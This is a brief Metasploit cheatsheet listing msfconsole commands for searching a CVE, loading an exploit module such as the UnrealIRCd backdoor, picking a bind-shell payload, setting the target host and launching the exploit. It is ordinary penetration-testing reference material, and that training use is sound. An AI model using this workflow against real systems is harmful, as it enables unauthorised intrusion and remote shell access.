# Metasploit cheatsheet

```sh
msfconsole

# Commands to run once the console is running
search code-of-vulnerability 
# example 
# search cve-2010-2075

use id-of-exploit
# remplace id-of-exploit by the id of the result of the search or the path of the module
# example
# use 0
# use exploit/unix/irc/unreal_ircd_3281_backdoor

show payloads

set payload id-of-payload
# replace id-of-payload by the id of the result of show payloads or the path
# example
# set payload 0
# set payload cmd/unix/bind_perl

show options

set OPTION_NAME value
# example
set RHOST 192.168.10.11

show targets
set target 0

exploit
```